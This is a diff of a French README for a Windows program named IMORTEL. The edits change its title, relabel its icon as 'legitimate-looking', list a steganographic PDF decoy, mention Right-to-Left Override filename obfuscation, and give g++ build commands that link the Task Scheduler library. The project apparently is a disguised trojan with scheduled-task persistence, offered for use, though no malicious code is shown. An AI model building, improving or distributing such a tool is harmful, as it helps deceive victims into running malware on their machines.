@@ -172,7 +172,7 @@ Maintenant, appliquez la technique d'obfuscation avec le caractère Right-to-Lef
   ┌──────────────────────────────────────────────────────────────┐
   │                                                              │
   │        ╔════════════════════════════════════════╗           │
-  │        ║   IMORTEL — System v1.0         _ □ ✕ ║           │
+  │        ║   IMORTEL — SHADOWVORCS v1.0    _ □ ✕ ║           │
   │        ╠════════════════════════════════════════╣           │
   │        ║                                        ║           │
   │        ║     ██████████████████████████████     ║           │
@@ -233,7 +233,7 @@ Maintenant, appliquez la technique d'obfuscation avec le caractère Right-to-Lef
 | `imortel.rar` | ARCHIVE | Projet complet empaqueté | [⬇ Télécharger](./imortel.rar) |
 | `imortel.pdf` | DOC | Leurre stéganographique PDF | [⬇ Télécharger](./imortel.pdf) |
 | `imortel.png` | IMAGE | Screenshot | [👁 Voir](./imortel.png) |
-| `imortel.ico` | ICON | Icône de l'application | [⬇ Télécharger](./imortel.ico) |
+| `imortel.ico` | ICON | Icône d'apparence légitime | [⬇ Télécharger](./imortel.ico) |
 
 </div>
 
@@ -247,10 +247,10 @@ Maintenant, appliquez la technique d'obfuscation avec le caractère Right-to-Lef
 
 ```
   ┌───────────────────────────────────────────────────────────┐
-  │   OS          Windows 7 / 8 / 10 / 11  (32 ou 64 bits)   │
-  │   Compilateur g++ (MinGW-w64)  ≥  8.0                    │
-  │   IDE         Visual Studio Code  (recommandé)            │
-  │   Shell       PowerShell  /  CMD  /  Git Bash             │
+  │   OS           Windows 7 / 8 / 10 / 11 (32 ou 64 bits)    │
+  │   Compilateur  g++ (MinGW-w64) ≥ 8.0                      │
+  │   IDE          CLion ou Visual Studio Code (recommandé)   │
+  │   Shell        PowerShell  /  CMD  /  Git Bash            │
   └───────────────────────────────────────────────────────────┘
 ```
 
@@ -282,15 +282,15 @@ g++ (x86_64-posix-seh-rev0, Built by MinGW-Builds project) 13.x.x
 ### Étape 2 — Extensions VS Code recommandées
 
 ```
-  C/C++                ── ms-vscode.cpptools
-  C/C++ Extension Pack ── ms-vscode.cpptools-extension-pack
-  Code Runner          ── formulahendry.code-runner
+  C/C++ ─ ms-vscode.cpptools
+  C/C++ Extension Pack ─ ms-vscode.cpptools-extension-pack
+  Code Runner ─ formulahendry.code-runner
 ```
 
 ### Étape 3 — Se placer dans le bon répertoire
 
 ```powershell
-cd C:\Users\TonNom\Desktop\IMORTEL
+cd C:\Users\anon\Desktop\IMORTEL
 ```
 
 ---
@@ -330,7 +330,7 @@ g++ -o imortel.exe imortel.cpp -m32 -luser32 -lgdi32 -lshell32 -lwinmm -lole32 -
   └─────────────────────┴──────────────────────────────────────────────────────┘
 ```
 
-### ✅ VERSION 2 — x64 · Task Scheduler
+### ✅ VERSION 2 — x64 · Task Scheduler (Recommandé)
 
 ```bash
 g++ imortel.cpp -o imortel.exe -luser32 -lgdi32 -lshell32 -lwinmm -lole32 -loleaut32 -ltaskschd
